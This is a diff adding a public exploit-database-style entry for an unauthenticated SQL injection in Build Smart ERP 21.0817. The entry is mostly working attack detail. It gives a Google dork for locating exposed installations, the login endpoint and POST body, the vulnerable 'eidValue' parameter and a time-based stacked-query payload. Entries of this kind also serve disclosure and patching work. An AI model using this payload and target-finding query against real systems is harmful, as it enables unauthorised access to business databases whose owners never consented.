@@ -1,0 +1,24 @@
+# Exploit Title: Build Smart ERP 21.0817 - 'eidValue' SQL Injection (Unauthenticated)
+# Date: 24/10/2021
+# Exploit Author: Nehru Sethuraman
+# Vendor Homepage: https://ribccs.com/solutions/solution-buildsmart
+# Version: 21.0817
+# Build: 3
+# Google Dorks: intitle:buildsmart accounting
+# Tested on: OS - Windows 2012 R2 or 8.1  & Database - Microsoft SQL Server 2014
+
+Exploit Details:
+
+URL: https://example.com/acc/validateLogin.asp?SkipDBSetup=NO&redirectUrl=
+
+*HTTP Method:* POST
+
+*POST DATA:*
+
+VersionNumber=21.0906&activexVersion=3%2C9%2C0%2C0&XLImportCab=1%2C21%2C0%2C0&updaterActivexVersion=4%2C19%2C0%2C0&lang=eng&rptlang=eng&loginID=admin&userPwd=admin&EID=company&eidValue=company&userEmail=
+
+Vulnerable Parameter: eidValue
+
+SQL Injection Type: Stacked queries
+
+Payload: ';WAITFOR DELAY '0:0:3'--
